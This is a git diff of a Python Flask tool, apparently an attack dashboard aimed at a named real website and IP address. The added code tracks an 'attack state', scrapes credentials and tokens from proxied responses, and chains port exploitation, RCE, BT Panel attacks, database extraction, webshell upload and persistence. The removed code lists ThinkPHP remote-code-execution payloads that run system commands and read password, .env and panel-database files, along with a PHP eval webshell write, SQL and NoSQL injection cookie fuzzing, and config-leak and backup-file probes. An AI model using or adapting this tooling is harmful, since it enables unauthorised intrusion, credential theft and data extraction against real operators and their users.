@@ -9,12 +9,19 @@ import json
 import time
 import threading
 import hashlib
+import subprocess
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
+import paramiko
+import pymysql
+import redis
+import ftplib
+import smtplib
+from bs4 import BeautifulSoup
 
-# Disable SSL warnings for testing
+# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__, static_folder='.')
@@ -23,18 +30,39 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 TARGET = "https://goldmedal.cc"
 TARGET_IP = "31.59.114.216"
 
-# Cache for performance
-cache = {}
-CACHE_DURATION = 30  # seconds
+# Global attack state - stores all discovered data for chained attacks
+attack_state = {
+    'open_ports': [],
+    'discovered_credentials': [],
+    'discovered_endpoints': [],
+    'discovered_files': [],
+    'vulnerable_params': [],
+    'rce_verified': False,
+    'current_shell': None,
+    'extracted_configs': {},
+    'bt_panel_url': None,
+    'git_files': [],
+    'backup_files': [],
+    'database_info': {},
+    'attack_history': [],
+    'session_cookies': {},
+    'csrf_tokens': [],
+    'api_keys': [],
+    'admin_urls': [],
+    'upload_endpoints': [],
+    'webshell_locations': [],
+    'lfi_vulnerabilities': [],
+    'sqli_vulnerabilities': [],
+    'ssrf_endpoints': [],
+}
 
-# Thread pool for concurrent scans
-executor = ThreadPoolExecutor(max_workers=20)
-
-# Session pool for connection reuse
+# Thread pool for concurrent attacks
+executor = ThreadPoolExecutor(max_workers=30)
 session_pool = {}
+cache = {}
+CACHE_DURATION = 30
 
 def get_session():
-    """Get or create a session for connection reuse"""
     thread_id = threading.get_ident()
     if thread_id not in session_pool:
         session = requests.Session()
@@ -45,8 +73,24 @@ def get_session():
         session_pool[thread_id] = session
     return session_pool[thread_id]
 
+def add_to_attack_state(category, data):
+    """Add discovered data to attack state for chained attacks"""
+    if category not in attack_state:
+        attack_state[category] = []
+    if isinstance(data, list):
+        attack_state[category].extend(data)
+    else:
+        attack_state[category].append(data)
+    # Remove duplicates
+    attack_state[category] = list(set(attack_state[category]))
+    attack_state['attack_history'].append({
+        'timestamp': datetime.now().isoformat(),
+        'category': category,
+        'data': str(data)[:200]
+    })
+
 # ============================================================
-# SERVE HTML - No Authentication Required
+# SERVE HTML
 # ============================================================
 @app.route('/')
 def index():
@@ -59,14 +103,71 @@ def serve_static(filename):
     return jsonify({'error': 'File not found'}), 404
 
 # ============================================================
-# PROXY - Enhanced CORS Bypass with Cache
+# ATTACK STATE MANAGEMENT
 # ============================================================
-@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
+@app.route('/attack-state')
+def get_attack_state():
+    """Get current attack state for dashboard display"""
+    return jsonify({
+        'attack_state': {
+            'open_ports': attack_state['open_ports'],
+            'credentials_found': len(attack_state['discovered_credentials']),
+            'endpoints_discovered': len(attack_state['discovered_endpoints']),
+            'files_found': len(attack_state['discovered_files']),
+            'rce_verified': attack_state['rce_verified'],
+            'bt_panel_found': attack_state['bt_panel_url'] is not None,
+            'backup_files': len(attack_state['backup_files']),
+            'git_leaked': len(attack_state['git_files']) > 0,
+            'database_compromised': len(attack_state['database_info']) > 0,
+            'api_keys_found': len(attack_state['api_keys']),
+            'admin_urls': attack_state['admin_urls'],
+            'attack_count': len(attack_state['attack_history']),
+            'recent_attacks': attack_state['attack_history'][-10:],
+            'lfi_found': len(attack_state['lfi_vulnerabilities']),
+            'sqli_found': len(attack_state['sqli_vulnerabilities']),
+            'ssrf_found': len(attack_state['ssrf_endpoints']),
+            'upload_endpoints': attack_state['upload_endpoints'],
+        }
+    })
+
+@app.route('/reset-state')
+def reset_attack_state():
+    """Reset attack state"""
+    global attack_state
+    attack_state = {
+        'open_ports': [],
+        'discovered_credentials': [],
+        'discovered_endpoints': [],
+        'discovered_files': [],
+        'vulnerable_params': [],
+        'rce_verified': False,
+        'current_shell': None,
+        'extracted_configs': {},
+        'bt_panel_url': None,
+        'git_files': [],
+        'backup_files': [],
+        'database_info': {},
+        'attack_history': [],
+        'session_cookies': {},
+        'csrf_tokens': [],
+        'api_keys': [],
+        'admin_urls': [],
+        'upload_endpoints': [],
+        'webshell_locations': [],
+        'lfi_vulnerabilities': [],
+        'sqli_vulnerabilities': [],
+        'ssrf_endpoints': [],
+    }
+    return jsonify({'message': 'Attack state reset', 'timestamp': datetime.now().isoformat()})
+
+# ============================================================
+# PROXY - Enhanced with Auto-Discovery
+# ============================================================
+@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
 def proxy():
     path = request.args.get('path', '/')
     url = f"{TARGET}/{path.lstrip('/')}"
     
-    # Check cache for GET requests
     cache_key = f"proxy:{request.method}:{url}"
     if request.method == 'GET' and cache_key in cache:
         cached_time, cached_data = cache[cache_key]
@@ -75,10 +176,8 @@ def proxy():
     
     headers = {
         'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate',
-        'Connection': 'keep-alive',
     }
     
     cookies = {}
@@ -90,1041 +189,624 @@ def proxy():
         session = get_session()
         
         if request.method == 'GET':
-            resp = session.get(url, headers=headers, cookies=cookies, 
-                             allow_redirects=False, timeout=15)
+            resp = session.get(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=15)
         elif request.method == 'POST':
-            resp = session.post(url, headers=headers, cookies=cookies,
-                              data=request.get_data(), allow_redirects=False, timeout=15)
+            resp = session.post(url, headers=headers, cookies=cookies, data=request.get_data(), 
+                              allow_redirects=False, timeout=15)
         elif request.method == 'PUT':
-            resp = session.put(url, headers=headers, cookies=cookies,
-                             data=request.get_data(), allow_redirects=False, timeout=15)
+            resp = session.put(url, headers=headers, cookies=cookies, data=request.get_data(), 
+                             allow_redirects=False, timeout=15)
         elif request.method == 'DELETE':
-            resp = session.delete(url, headers=headers, cookies=cookies,
-                                allow_redirects=False, timeout=15)
+            resp = session.delete(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=15)
         else:
-            resp = session.request(request.method, url, headers=headers,
-                                 cookies=cookies, data=request.get_data(),
-                                 allow_redirects=False, timeout=15)
+            resp = session.request(request.method, url, headers=headers, cookies=cookies, 
+                                 data=request.get_data(), allow_redirects=False, timeout=15)
+        
+        # Auto-discover from response
+        body = resp.text[:10000]
+        
+        # Extract endpoints from response
+        discovered_endpoints = re.findall(r'(?:href|src|action|url)\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
+        discovered_endpoints += re.findall(r'["\'](\/[a-zA-Z0-9/_-]*(?:api|admin|login|register|upload|download|config)[a-zA-Z0-9/_-]*)["\']', body, re.IGNORECASE)
+        
+        # Extract potential credentials
+        credentials_pattern = re.findall(r'(?:password|passwd|pwd|secret|token|key|api_key)\s*[:=]\s*["\']([^"\']{3,})["\']', body, re.IGNORECASE)
+        
+        # Extract CSRF tokens
+        csrf_tokens = re.findall(r'(?:csrf|_token|authenticity_token).*?value\s*=\s*["\']([^"\']+)["\']', body, re.IGNORECASE)
+        
+        # Auto-store discoveries
+        if discovered_endpoints:
+            add_to_attack_state('discovered_endpoints', discovered_endpoints[:10])
+        if credentials_pattern:
+            add_to_attack_state('discovered_credentials', credentials_pattern)
+        if csrf_tokens:
+            add_to_attack_state('csrf_tokens', csrf_tokens)
         
         result = {
             'url': url,
             'status_code': resp.status_code,
             'headers': dict(resp.headers),
-            'body': resp.text[:10000],
+            'body': body,
             'length': len(resp.text),
-            'timestamp': datetime.now().isoformat()
+            'timestamp': datetime.now().isoformat(),
+            'auto_discoveries': {
+                'new_endpoints': discovered_endpoints[:5] if discovered_endpoints else [],
+                'credentials_found': len(credentials_pattern) > 0,
+                'csrf_tokens': csrf_tokens[:3] if csrf_tokens else [],
+            }
         }
         
-        # Cache GET requests
         if request.method == 'GET':
             cache[cache_key] = (time.time(), result)
         
         return jsonify(result)
-    except requests.exceptions.Timeout:
-        return jsonify({'error': 'Request timed out', 'url': url}), 504
-    except requests.exceptions.ConnectionError:
-        return jsonify({'error': 'Connection failed', 'url': url}), 502
     except Exception as e:
         return jsonify({'error': str(e), 'url': url}), 500
 
 # ============================================================
-# ADVANCED COOKIE TESTING - Multi-threaded
+# AUTOMATED ATTACK CHAINS
 # ============================================================
-@app.route('/test/cookie/<value>')
-def test_cookie(value):
-    encoded = base64.b64encode(value.encode()).decode()
-    try:
-        r = requests.get(f"{TARGET}/index.php", 
-                        cookies={'username': encoded},
-                        timeout=10, verify=False)
-        
-        # Enhanced analysis
-        response_analysis = {
-            'has_error': 'error' in r.text.lower() or 'exception' in r.text.lower(),
-            'has_login': 'login' in r.text.lower(),
-            'has_admin': 'admin' in r.text.lower(),
-            'has_dashboard': 'dashboard' in r.text.lower(),
-            'content_type': r.headers.get('Content-Type', ''),
-            'redirect_url': r.headers.get('Location', ''),
+@app.route('/auto-attack/full-scan')
+def full_auto_scan():
+    """Execute complete automated attack chain"""
+    results = {
+        'phase1_recon': {},
+        'phase2_vulnerability': {},
+        'phase3_exploitation': {},
+        'phase4_post_exploitation': {},
+    }
+    
+    # Phase 1: Reconnaissance
+    results['phase1_recon'] = {
+        'port_scan': _scan_ports(),
+        'header_analysis': _check_headers_internal(),
+        'endpoint_discovery': _discover_endpoints(),
+        'backup_scan': _scan_backups_internal(),
+        'git_scan': _scan_git_internal(),
+    }
+    
+    # Phase 2: Vulnerability Assessment
+    results['phase2_vulnerability'] = {
+        'config_extraction': _extract_configs(),
+        'cookie_testing': _test_cookies_internal(),
+        'idor_testing': _test_idor_internal(),
+        'lfi_testing': _test_lfi(),
+        'sqli_testing': _test_sqli(),
+    }
+    
+    # Phase 3: Exploitation
+    if attack_state['open_ports']:
+        results['phase3_exploitation'] = {
+            'port_exploitation': _exploit_open_ports(),
+            'rce_attempts': _fire_rce_payloads(),
+            'bt_panel_attack': _attack_bt_panel(),
         }
-        
-        return jsonify({
-            'value_tested': value,
-            'encoded_cookie': encoded,
-            'status': r.status_code,
-            'length': len(r.text),
-            'different_from_default': len(r.text) > 500,
-            'analysis': response_analysis,
-            'snippet': r.text[:1000]
-        })
-    except Exception as e:
-        return jsonify({'error': str(e)})
+    
+    # Phase 4: Post-Exploitation
+    if attack_state['rce_verified'] or attack_state['discovered_credentials']:
+        results['phase4_post_exploitation'] = {
+            'credential_testing': _test_credentials_on_services(),
+            'database_extraction': _extract_database_data(),
+            'file_exploration': _explore_filesystem(),
+            'persistence_check': _check_persistence(),
+        }
+    
+    return jsonify({
+        'scan_complete': True,
+        'results': results,
+        'attack_state_summary': {
+            'critical_findings': len([a for a in attack_state['attack_history'] if 'critical' in str(a).lower()]),
+            'total_discoveries': sum(len(v) if isinstance(v, list) else 1 for v in attack_state.values() if v),
+            'rce_achieved': attack_state['rce_verified'],
+        }
+    })
 
-@app.route('/hunt/cookie-fuzz')
-def cookie_fuzz():
-    """Enhanced cookie fuzzing with concurrent requests"""
-    values = [
-        # Basic auth bypass
-        'admin', 'root', 'administrator', '1', 'true', 'yes',
-        # JSON injection
-        '{"role":"admin"}', '{"id":1}', '{"user":"admin"}',
-        '{"username":"admin"}', '{"is_admin":true}',
-        # Existing user
-        'Marufbelay', '', 'guest', 'test', 'user',
-        # SQL injection
-        'or 1=1', "' or '1'='1", '" or "1"="1',
-        "admin' --", "admin' #", "1' or '1'='1",
-        # NoSQL injection
-        '{"$gt":""}', '{"$ne":null}', '[$ne]=',
-        # Path traversal
-        '../../etc/passwd', '..\\..\\windows\\win.ini',
-        # Special values
-        '0', '-1', 'null', 'undefined', 'NaN',
-        'true', 'false', 'yes', 'no',
-        # Encoded payloads
-        base64.b64encode('admin'.encode()).decode(),
-        base64.b64encode('root'.encode()).decode(),
-        # XSS
-        '<script>alert(1)</script>',
-        # SSTI
-        '{{7*7}}', '${7*7}',
-    ]
+@app.route('/auto-attack/chain-exploit')
+def chain_exploit():
+    """Chain multiple vulnerabilities together"""
+    results = {}
     
-    results = []
+    # If we have RCE, use it for everything
+    if attack_state['rce_verified']:
+        results['rce_exploitation'] = _deep_rce_exploitation()
     
-    def test_value(val):
-        encoded = base64.b64encode(val.encode()).decode()
-        try:
-            r = requests.get(f"{TARGET}/index.php", 
-                           cookies={'username': encoded},
-                           timeout=10, verify=False)
-            
-            # Advanced response analysis
-            is_error = 'HttpException' in r.text
-            has_module_error = 'module not exists' in r.text.lower()
-            has_redirect = r.status_code in [301, 302, 303, 307, 308]
-            
-            # Check for sensitive content
-            sensitive_keywords = ['admin', 'dashboard', 'control', 'panel', 'manage',
-                                 'users', 'settings', 'config', 'database']
-            has_sensitive = any(kw in r.text.lower() for kw in sensitive_keywords)
-            
-            return {
-                'value': val,
-                'encoded': encoded,
-                'status': r.status_code,
-                'length': len(r.text),
-                'is_error_page': is_error,
-                'has_redirect': has_redirect,
-                'redirect_to': r.headers.get('Location', ''),
-                'has_sensitive': has_sensitive,
-                'potential_impact': not is_error and not has_module_error and len(r.text) > 500,
-                'snippet': r.text[:300]
-            }
-        except Exception as e:
-            return {'value': val, 'error': str(e)}
+    # If we have database credentials, extract everything
+    if attack_state['database_info']:
+        results['database_exploitation'] = _full_database_extraction()
     
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(test_value, val) for val in values]
-        for future in as_completed(futures):
-            results.append(future.result())
+    # If we have open ports, attack each service
+    if attack_state['open_ports']:
+        results['service_exploitation'] = _attack_all_services()
     
-    return jsonify(results)
+    # If we have LFI, try to get RCE
+    if attack_state['lfi_vulnerabilities']:
+        results['lfi_to_rce'] = _lfi_to_rce()
+    
+    # If we have SQLi, extract database
+    if attack_state['sqli_vulnerabilities']:
+        results['sqli_exploitation'] = _exploit_sqli()
+    
+    # If we have file upload, try webshell
+    if attack_state['upload_endpoints']:
+        results['webshell_upload'] = _upload_webshell()
+    
+    return jsonify({
+        'chain_exploit_complete': True,
+        'results': results,
+        'new_findings': len(attack_state['attack_history']) - len(results)
+    })
 
 # ============================================================
-# ENHANCED ThinkPHP CONFIG LEAK
+# PORT EXPLOITATION
 # ============================================================
-@app.route('/hunt/thinkphp-config')
-def thinkphp_config():
-    """Comprehensive ThinkPHP config extraction"""
-    payloads = [
-        # Database configs
-        '/index.php?s=index/think\\config/get&name=database',
-        '/index.php?s=index/think\\config/get&name=database.hostname',
-        '/index.php?s=index/think\\config/get&name=database.username',
-        '/index.php?s=index/think\\config/get&name=database.password',
-        '/index.php?s=index/think\\config/get&name=database.database',
-        '/index.php?s=index/think\\config/get&name=database.hostport',
-        '/index.php?s=index/think\\config/get&name=database.dsn',
-        '/index.php?s=index/think\\config/get&name=database.params',
-        '/index.php?s=index/think\\config/get&name=database.prefix',
-        '/index.php?s=index/think\\config/get&name=database.type',
-        
-        # App configs
-        '/index.php?s=index/think\\config/get&name=app',
-        '/index.php?s=index/think\\config/get&name=app.app_key',
-        '/index.php?s=index/think\\config/get&name=app.app_secret',
-        '/index.php?s=index/think\\config/get&name=app.app_debug',
-        '/index.php?s=index/think\\config/get&name=app.app_trace',
-        '/index.php?s=index/think\\config/get&name=app.default_return_type',
-        
-        # Cache configs
-        '/index.php?s=index/think\\config/get&name=cache',
-        '/index.php?s=index/think\\config/get&name=cache.type',
-        '/index.php?s=index/think\\config/get&name=cache.host',
-        '/index.php?s=index/think\\config/get&name=cache.port',
-        '/index.php?s=index/think\\config/get&name=cache.password',
-        
-        # Session configs
-        '/index.php?s=index/think\\config/get&name=session',
-        '/index.php?s=index/think\\config/get&name=session.type',
-        '/index.php?s=index/think\\config/get&name=session.expire',
-        
-        # Cookie configs
-        '/index.php?s=index/think\\config/get&name=cookie',
-        '/index.php?s=index/think\\config/get&name=cookie.expire',
-        '/index.php?s=index/think\\config/get&name=cookie.domain',
-        '/index.php?s=index/think\\config/get&name=cookie.secure',
-        '/index.php?s=index/think\\config/get&name=cookie.httponly',
-        
-        # Template configs
-        '/index.php?s=index/think\\config/get&name=template',
-        '/index.php?s=index/think\\config/get&name=view_replace_str',
-        
-        # Log configs
-        '/index.php?s=index/think\\config/get&name=log',
-        '/index.php?s=index/think\\config/get&name=log.type',
-        '/index.php?s=index/think\\config/get&name=log.path',
-        '/index.php?s=index/think\\config/get&name=log.level',
-        
-        # Additional sensitive configs
-        '/index.php?s=index/think\\config/get&name=extra',
-        '/index.php?s=index/think\\config/get&name=mail',
-        '/index.php?s=index/think\\config/get&name=sms',
-        '/index.php?s=index/think\\config/get&name=wechat',
-        '/index.php?s=index/think\\config/get&name=alipay',
-        '/index.php?s=index/think\\config/get&name=pay',
-        
-        # Alternative payload formats
-        '/index.php?s=index/\\think\\Config/load&file=database',
-        '/index.php?s=index/\\think\\Config/load&file=app',
-        '/index.php?s=index/\\think\\Config/load&file=cache',
-    ]
-    
-    results = []
-    
-    def test_payload(p):
-        try:
-            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False,
-                           headers={'User-Agent': 'Mozilla/5.0'})
-            
-            # Analyze response for sensitive data
-            sensitive_patterns = {
-                'password': r'(?:password|pwd|pass)\s*[=:]\s*["\']?([^"\'&\s]+)',
-                'host': r'(?:hostname|host|server)\s*[=:]\s*["\']?([^"\'&\s]+)',
-                'username': r'(?:username|user|db_user)\s*[=:]\s*["\']?([^"\'&\s]+)',
-                'database': r'(?:database|db_name|db)\s*[=:]\s*["\']?([^"\'&\s]+)',
-                'key': r'(?:key|secret|token|app_key)\s*[=:]\s*["\']?([^"\'&\s]+)',
-                'port': r'(?:port|hostport)\s*[=:]\s*["\']?(\d+)',
-            }
-            
-            found_sensitive = {}
-            for name, pattern in sensitive_patterns.items():
-                matches = re.findall(pattern, r.text, re.IGNORECASE)
-                if matches:
-                    found_sensitive[name] = matches
-            
-            return {
-                'payload': p,
-                'status': r.status_code,
-                'length': len(r.text),
-                'has_sensitive_data': len(found_sensitive) > 0,
-                'sensitive_found': found_sensitive if found_sensitive else None,
-                'snippet': r.text[:2000]
-            }
-        except Exception as e:
-            return {'payload': p, 'error': str(e)}
-    
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=15) as executor:
-        futures = [executor.submit(test_payload, p) for p in payloads]
-        for future in as_completed(futures):
-            results.append(future.result())
-    
-    return jsonify(results)
-
-# ============================================================
-# ENHANCED RCE PAYLOADS
-# ============================================================
-@app.route('/hunt/rce-payloads')
-def rce_payloads():
-    """Comprehensive RCE payload testing"""
-    payloads = [
-        # PHP Info & System Info
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd',
-        
-        # File & Directory Operations
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/hosts',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
-        
-        # Network Info
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -an',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
-        
-        # File reading via PHP functions
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/etc/passwd',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/.env',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/config/database.php',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/server/panel/data/default.db',
-        
-        # Directory scanning
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/tmp/',
-        
-        # Alternative payload patterns
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=phpinfo();',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars[1][]=id',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][]=id',
-        
-        # Request method variation (POST)
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
-        
-        # Template injection attempts
-        '/index.php?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>',
-        '/index.php?s=index/think\\template\\driver\\file/write&cacheFile=shell.php&content=<?php @eval($_POST[cmd]);?>',
-    ]
-    
-    results = []
-    
-    def test_payload(p):
-        try:
-            # Test GET
-            r = requests.get(f"{TARGET}{p}", timeout=15, verify=False,
-                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-            
-            # Enhanced detection
-            is_potential_rce = False
-            indicators = []
-            
-            # Check for common RCE success indicators
-            if r.status_code == 200 and len(r.text) > 100:
-                if 'module not exists' not in r.text.lower():
-                    if 'uid=' in r.text or 'gid=' in r.text:
-                        indicators.append('Unix user info detected')
-                        is_potential_rce = True
-                    if 'root:' in r.text or '/bin/bash' in r.text:
-                        indicators.append('Passwd file content detected')
-                        is_potential_rce = True
-                    if 'phpinfo' in r.text.lower() or 'PHP Version' in r.text:
-                        indicators.append('PHP info detected')
-                        is_potential_rce = True
-                    if 'total' in r.text.lower() and ('drwx' in r.text or '-rw' in r.text):
-                        indicators.append('Directory listing detected')
-                        is_potential_rce = True
-                    if 'www' in r.text.lower() and len(r.text) > 200:
-                        indicators.append('Potential file system access')
-                        is_potential_rce = True
-            
-            return {
-                'payload': p,
-                'status': r.status_code,
-                'length': len(r.text),
-                'potential_rce': is_potential_rce,
-                'indicators': indicators,
-                'snippet': r.text[:2000]
-            }
-        except Exception as e:
-            return {'payload': p, 'error': str(e)}
-    
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=15) as executor:
-        futures = [executor.submit(test_payload, p) for p in payloads]
-        for future in as_completed(futures):
-            results.append(future.result())
-    
-    return jsonify(results)
-
-# ============================================================
-# .GIT LEAK DETECTION - Enhanced
-# ============================================================
-@app.route('/hunt/git-leak')
-def git_leak():
-    """Comprehensive .git exposure check"""
-    paths = [
-        '/.git/HEAD', '/.git/config', '/.git/index',
-        '/.git/refs/heads/master', '/.git/refs/heads/main',
-        '/.git/refs/heads/develop', '/.git/refs/stash',
-        '/.git/logs/HEAD', '/.git/logs/refs/heads/master',
-        '/.git/logs/refs/heads/main',
-        '/.git/COMMIT_EDITMSG', '/.git/description',
-        '/.git/hooks/', '/.git/hooks/pre-commit',
-        '/.git/hooks/post-commit', '/.git/info/exclude',
-        '/.git/objects/info/packs', '/.git/packed-refs',
-        '/.git/FETCH_HEAD', '/.git/ORIG_HEAD',
-        '/.git/refs/remotes/origin/HEAD',
-        '/.git/refs/tags/', '/.git/info/refs',
-        '/.gitignore', '/.gitattributes',
-    ]
-    
-    results = []
-    
-    def check_path(p):
-        try:
-            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
-            
-            # Analyze content for sensitive info
-            has_refs = 'ref:' in r.text or 'refs/' in r.text
-            has_commit = re.search(r'[a-f0-9]{40}', r.text)
-            has_remote = 'url = ' in r.text.lower() or 'remote' in r.text.lower()
-            
-            return {
-                'path': p,
-                'status': r.status_code,
-                'length': len(r.text),
-                'has_refs': has_refs,
-                'has_commit_hash': bool(has_commit),
-                'has_remote_info': has_remote,
-                'content': r.text[:500] if r.status_code == 200 else None
-            }
-        except Exception as e:
-            return {'path': p, 'error': str(e)}
-    
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=15) as executor:
-        futures = [executor.submit(check_path, p) for p in paths]
-        for future in as_completed(futures):
-            results.append(future.result())
-    
-    return jsonify(results)
-
-# ============================================================
-# BACKUP FILE FINDER - Enhanced
-# ============================================================
-@app.route('/hunt/backup-files')
-def backup_files():
-    """Enhanced backup file discovery"""
-    backups = [
-        # Common web backups
-        'backup.zip', 'backup.tar.gz', 'backup.rar', 'backup.7z',
-        'www.zip', 'www.tar.gz', 'web.zip', 'web.tar.gz',
-        'site.zip', 'site.tar.gz', 'backup.tar', 'backup.bz2',
-        
-        # Project-specific
-        'invest307.fa.zip', 'invest307.zip', 'invest.zip',
-        'goldmedal.zip', 'goldmedal.tar.gz', 'goldmedal.rar',
-        'invest307.fa.tar.gz', 'goldmedal_backup.zip',
-        
-        # SQL dumps
-        'backup.sql', 'database.sql', 'dump.sql', 'db.sql',
-        'export.sql', 'backup_db.sql', 'data.sql', 'mysql.sql',
-        'backup-{}.sql'.format(datetime.now().strftime('%Y%m%d')),
-        'backup-{}.sql'.format(datetime.now().strftime('%Y-%m-%d')),
-        
-        # Config files
-        '.env', '.env.backup', '.env.production', '.env.local',
-        '.env.development', '.env.example', '.env.old',
-        '.env.prod', '.env.staging',
-        'config.php.bak', 'config.php.old', 'config.php.save',
-        'config.php~', 'config.php.swp',
-        'database.php.bak', 'database.php.old',
-        'database.yml', 'database.yaml',
-        
-        # Admin backups
-        'admin.php.bak', 'index.php.bak', 'index.php.old',
-        'admin.old', 'admin.bak',
-        
-        # Other sensitive files
-        'phpinfo.php', 'info.php', 'test.php', 'install.php',
-        'admin.php', 'config.php', 'db.php', 'setup.php',
-        'README.md', 'readme.html', 'changelog.txt',
-        'composer.json', 'composer.lock', 'package.json',
-        'package-lock.json', 'yarn.lock',
-        '.htaccess', '.nginx.conf', 'nginx.conf',
-        'docker-compose.yml', 'Dockerfile',
-        '.DS_Store', '.vscode/', '.idea/',
-        'credentials.txt', 'passwords.txt', 'secrets.txt',
-        'adminer.php', 'phpMyAdmin/', 'pma/',
-        
-        # Log files
-        'error.log', 'access.log', 'debug.log', 'app.log',
-        'runtime/log/', 'logs/error.log',
-        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/invest307.fa/',
-    ]
-    
-    results = []
-    
-    def check_file(b):
-        try:
-            r = requests.get(f"{TARGET}/{b}", timeout=10, verify=False,
-                           headers={'User-Agent': 'Mozilla/5.0'})
-            
-            if r.status_code == 200 and len(r.text) > 0:
-                # Check for sensitive content
-                has_passwords = bool(re.search(r'(?:password|passwd|pwd|secret|token|key)\s*[:=]\s*["\']?([^"\'&\s]{3,})', 
-                                             r.text, re.IGNORECASE))
-                has_sql = bool(re.search(r'(?:CREATE TABLE|INSERT INTO|DROP TABLE|ALTER TABLE)', 
-                                        r.text, re.IGNORECASE))
-                has_config = bool(re.search(r'(?:define\(|config\[|env\(|\$\w+\s*=\s*)', 
-                                          r.text))
-                
-                return {
-                    'file': f'/{b}',
-                    'status': r.status_code,
-                    'size': len(r.text),
-                    'size_kb': round(len(r.text) / 1024, 2),
-                    'content_type': r.headers.get('Content-Type', 'unknown'),
-                    'has_passwords': has_passwords,
-                    'has_sql': has_sql,
-                    'has_config': has_config,
-                    'snippet': r.text[:500]
-                }
-        except:
-            pass
-        
-        # Try direct IP
-        try:
-            r = requests.get(f"http://{TARGET_IP}/{b}", timeout=5, verify=False)
-            if r.status_code == 200:
-                return {
-                    'file': f'[DIRECT IP] /{b}',
-                    'status': r.status_code,
-                    'size': len(r.text),
-                    'size_kb': round(len(r.text) / 1024, 2),
-                    'content_type': r.headers.get('Content-Type', 'unknown'),
-                    'snippet': r.text[:500]
-                }
-        except:
-            pass
-        
-        return None
-    
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(check_file, b) for b in backups]
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                results.append(result)
-    
-    return jsonify(results)
-
-# ============================================================
-# BT PANEL & SERVER TESTING - Enhanced
-# ============================================================
-@app.route('/hunt/bt-panel')
-def bt_panel_check():
-    """Enhanced BT Panel detection"""
-    results = []
-    
-    # Common BT Panel paths
-    bt_paths = ['/', '/login', '/site', '/soft', '/cron', '/firewall', '/files']
-    
-    # Check via direct IP on common BT ports
-    bt_ports = [
-        (8888, 'BT Panel (New)'),
-        (888, 'BT Panel (Old)'),
-        (7800, 'BT Panel Alt'),
-        (80, 'HTTP'),
-        (443, 'HTTPS'),
-        (8080, 'HTTP Alt'),
-        (8443, 'HTTPS Alt'),
-    ]
-    
-    for port, service_name in bt_ports:
